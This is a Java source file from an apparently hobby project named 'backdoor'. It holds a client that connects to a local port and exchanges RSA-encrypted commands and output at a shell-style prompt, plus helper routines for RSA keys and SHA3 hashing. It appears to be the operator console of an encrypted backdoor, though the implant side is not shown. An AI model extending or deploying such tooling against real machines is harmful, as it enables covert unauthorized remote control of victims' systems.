package backdoor.java;

import java.io.File;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

import java.net.Socket;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;

import java.security.InvalidKeyException;
import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.spec.EncodedKeySpec;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.PKCS8EncodedKeySpec;
import java.security.spec.X509EncodedKeySpec;

import java.util.Base64;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;


public class Client {

    public static void main(String[] args) throws IOException, ClassNotFoundException, InterruptedException {
        
        final int PORT = Integer.parseInt(args[0]);

        Socket client = new Socket("127.0.0.1", PORT);
        
        try{

            ObjectInputStream inputStream = new ObjectInputStream(client.getInputStream());
            ObjectOutputStream outputStream = new ObjectOutputStream(client.getOutputStream());  
            File privateKeyFile = new File("privateKeyFile.txt");        
            File publicKeyFile = new File("publicKeyFile.txt");

            while(client.isConnected()){

                String decodedMessage = backdoor.java.Cryptography.decryptMesage((String)inputStream.readObject(), privateKeyFile);
                System.out.println("\n" + decodedMessage);
                    
                String outputMessage = System.console().readLine("$ ");
                outputStream.writeObject(backdoor.java.Cryptography.encryptMessage(outputMessage, publicKeyFile));

                if("exit".equals(outputMessage)){

                    outputStream.flush();
                    outputStream.close(); 
                    client.close();
                    
                    break;
                }
                
            }

        } catch (Exception exception) {
            exception.printStackTrace();
        }

    }

}

class Cryptography {
    
    public static void createRSAKeys(File publicKeyFile, File privateKeyFile)
    throws NoSuchAlgorithmException, FileNotFoundException, IOException {

        KeyPairGenerator generator = KeyPairGenerator.getInstance("RSA");
        generator.initialize(2048);
        KeyPair pair = generator.genKeyPair();
        
        try(FileOutputStream fileOutputStream = new FileOutputStream(publicKeyFile)){
            fileOutputStream.write(pair.getPublic().getEncoded());
        }
        
        try(FileOutputStream fileOutputStream = new FileOutputStream(privateKeyFile)){
            fileOutputStream.write(pair.getPrivate().getEncoded());
        }

    }

    public static PublicKey readRSAPublicKey(File KeyFile) 
    throws IOException, NoSuchAlgorithmException, InvalidKeySpecException {

        byte[] publicKeyBytes = Files.readAllBytes(KeyFile.toPath());
        KeyFactory keyFactory = KeyFactory.getInstance("RSA");
        EncodedKeySpec publicKeySpec = new X509EncodedKeySpec(publicKeyBytes);
        return keyFactory.generatePublic(publicKeySpec);

    }

    public static PrivateKey readRSAPrivateKey(File KeyFile)
    throws NoSuchAlgorithmException, IOException, InvalidKeySpecException {

        byte[] privateKeyBytes = Files.readAllBytes(KeyFile.toPath());
        KeyFactory keyFactory = KeyFactory.getInstance("RSA");
        EncodedKeySpec privateKeySpec = new PKCS8EncodedKeySpec(privateKeyBytes);
        return keyFactory.generatePrivate(privateKeySpec);

    }

    public static String encryptMessage(String message, File publicKeyFile) 
    throws NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, InvalidKeySpecException, IOException, IllegalBlockSizeException, BadPaddingException {

        Cipher encryptCipher = Cipher.getInstance("RSA");
        encryptCipher.init(Cipher.ENCRYPT_MODE, readRSAPublicKey(publicKeyFile));
        byte[] messageBytes = message.getBytes(StandardCharsets.UTF_8);
        byte[] encryptMessageBytes = encryptCipher.doFinal(messageBytes);
        return Base64.getEncoder().encodeToString(encryptMessageBytes);

    }


    public static String decryptMesage(String encryptMessage, File privateKeyFile)
    throws NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, InvalidKeySpecException, IOException, IllegalBlockSizeException, BadPaddingException {

        Cipher decryptCipher = Cipher.getInstance("RSA");
        decryptCipher.init(Cipher.DECRYPT_MODE, readRSAPrivateKey(privateKeyFile));
        byte[] decryptMessageBytes = decryptCipher.doFinal(Base64.getDecoder().decode(encryptMessage));
        return new String(decryptMessageBytes, StandardCharsets.UTF_8);

    }

    public static String hashMessage(String message) throws NoSuchAlgorithmException{
        
        final MessageDigest digest = MessageDigest.getInstance("SHA3-256");
        final byte[] hashBytes = digest.digest(message.getBytes(StandardCharsets.UTF_8));
        return bytesToHex(hashBytes);
    
    }

    private static String bytesToHex(byte[] hash){

        StringBuilder hexString = new StringBuilder(2 * hash.length);
        for (byte b : hash){
            String hex = Integer.toHexString(0xff & b);
            if (hex.length() == 1){
                hexString.append('0');
            }
            hexString.append(hex);
        }
        return hexString.toString();

    }

}
